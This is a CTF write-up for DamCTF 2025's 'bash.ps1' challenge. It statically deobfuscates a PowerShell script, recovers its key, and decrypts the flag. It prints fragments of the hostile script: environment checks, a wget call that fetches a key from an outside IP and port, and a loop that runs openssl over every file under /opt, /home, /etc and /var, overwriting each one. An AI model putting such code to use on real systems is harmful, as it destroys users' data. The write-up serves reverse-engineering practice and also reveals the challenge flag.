---
title: "bash.ps1 - DamCTF 2025"
category: "crypto"
subcategory: "aes"
type: "writeup"
tags: ["crypto", "aes", "cbc", "bash", "ps1", "damctf", "damctf-2025", "2025", "ctf-writeup"]
summary: "Category: Reverse Engineering"
source:
  name: "CTFtime writeup #40231"
  url: "https://ctftime.org/writeup/40231"
original_source: "https://github.com/alsadio/CTF-Writeups/tree/main/DamCTF-2025/rev/bash.ps1"
ctf:
  name: "DamCTF 2025"
  year: 2025
  challenge: "bash.ps1"
---

## Metadata

- **CTF:** DamCTF 2025
- **Task:** bash.ps1
- **Author team:** M4j4nDyn4sty
- **CTFtime:** <https://ctftime.org/writeup/40231>
- **Original writeup:** <https://github.com/alsadio/CTF-Writeups/tree/main/DamCTF-2025/rev/bash.ps1>

---
# DamCTF 2025: The Bash.ps1 Challenge

## Challenge Description  
**Category:** Reverse Engineering   
**Files:**   
\- `bash.ps1` - An obfuscated PowerShell script  
\- `enc` - An encrypted file with OpenSSL format

**Warning:** ⚠️ Do not run the PowerShell script! It contains code that could potentially harm your system.

## Initial Analysis

I started by examining the files to understand what I was dealing with:

```bash  
$ file *  
bash.ps1: ASCII text, with very long lines (2716), with CRLF line terminators  
enc: openssl enc'd data with salted password  
```

The challenge provides a PowerShell script and an encrypted file. The script appears to be responsible for decrypting the `enc` file, but is heavily obfuscated with variable and function names consisting entirely of 'A' characters.

## Approach: Systematic Deobfuscation

Rather than executing the potentially harmful script, I decided to analyze it statically by systematically renaming variables and functions based on their behavior.

## Step 1: Understanding the Script Flow

After deobfuscation, I identified that the script follows this sequence:

```  
Main  
├─ CheckEnvironment  
├─ BuildCharacterDictionary  
├─ DownloadKey  
├─ ProcessEncryptedFiles  
└─ RemoveKey  
```

## Step 2: Analyzing Each Function

### CheckEnvironment Function

This function implements safety checks to prevent accidental execution:

```powershell  
function CheckEnvironment   
{  
if ([int](&(Get-Command /???/id) -u) -cne -not [bool][byte]){exit}  
if (-not ((&(Get-Command /???/?at) /etc/*release*) | grep noble)){exit}  
if ((&(Get-Command /???/?at) /sys/class/net/enp0s3/address) -cne "08:00:27:eb:6b:49"){exit}  
}  
```

The key insights from this function:  
\- It checks if the script is running on Ubuntu 24.04 (Noble Numbat)  
\- It verifies a specific MAC address  
\- It ensures the script runs with specific user permissions

### BuildCharacterDictionary Function

This function constructs a custom character dictionary from OS information:

```powershell  
function BuildCharacterDictionary  
{  
$osReleaseLines = # Content of /etc/*release* from Ubuntu Noble  
$characterArray = # Complex concatenation of OS release lines  
$characterArray = (-join ($characterArray | sort-object | get-unique))  
$Global:CharacterDictionary = $characterArray  
}  
```

To accurately recreate this dictionary, I spun up a Docker container with Ubuntu Noble:

```bash  
$ docker run -it ubuntu:noble /bin/bash  
# Inside container  
$ cat /etc/*release*  
```

This gave me the exact OS release information needed to build the character dictionary. After processing according to the script's algorithm, I determined the dictionary was:  
```  
"-./:0123456789:=ABCDEGHIKLMNOPRSTUVY_abcdeghilmnoprstuvwy"  
```

### DownloadKey Function

This function constructs a URL and downloads the decryption key:

```powershell  
function DownloadKey   
{  
$keyUrl = # URL built from character indices  
$outputFile = $GLOBAL:CharacterDictionary[16] # 'A'  
&(Get-Command /???/?ge?) $keyUrl -q -O $outputFile  
}  
```

By decoding the character indices against our dictionary, I determined the command being executed was:  
```bash  
wget 35.87.165.65:31337/key -q -O A  
```

This downloads a key from the given IP address and port, saving it to a file named 'A'. For the challenge, I created this file with the mentioned key content.

### ProcessEncryptedFiles Function

This function executes the actual decryption:

```powershell  
function ProcessEncryptedFiles  
{  
foreach ($encryptedFile in (Invoke-Expression ('find /opt/ -type f')))  
{  
Invoke-Expression ("openssl enc -aes-256-cbc -d -pass file:key -in $encryptedFile -out $encryptedFile")  
}  
# Similar loops for /home/, /etc/, and /var/  
}  
```

The function:  
1\. Searches four system directories (/opt/, /home/, /etc/, /var/) for all files  
2\. Attempts to decrypt each file using OpenSSL with AES-256-CBC  
3\. Uses the key downloaded earlier

This informed me that I needed to use OpenSSL with AES-256-CBC for decryption.

## Step 3: Decrypting the Flag

Based on my analysis, I knew:  
1\. The encryption algorithm (AES-256-CBC)  
2\. The key was downloaded to a file named 'A'

The key downloaded from the URL was:  
```  
I understand that, without my agreement, Alpine F1 have put out a press release late this afternoon that I am driving for them next year. This is wrong and I have not signed a contract with Alpine for 2023. I will not be driving for Alpine next year.  
```

To decrypt the flag, I ran:  
NOTE: I renamed enc to encrypted_file  
```bash  
$ openssl enc -aes-256-cbc -d -pass file:A -in encrypted_file -out flag  
$ cat flag  
dam{unattended_arch_boxes_will_be_given_powershell}  
```

## Flag  
`dam{unattended_arch_boxes_will_be_given_powershell}`
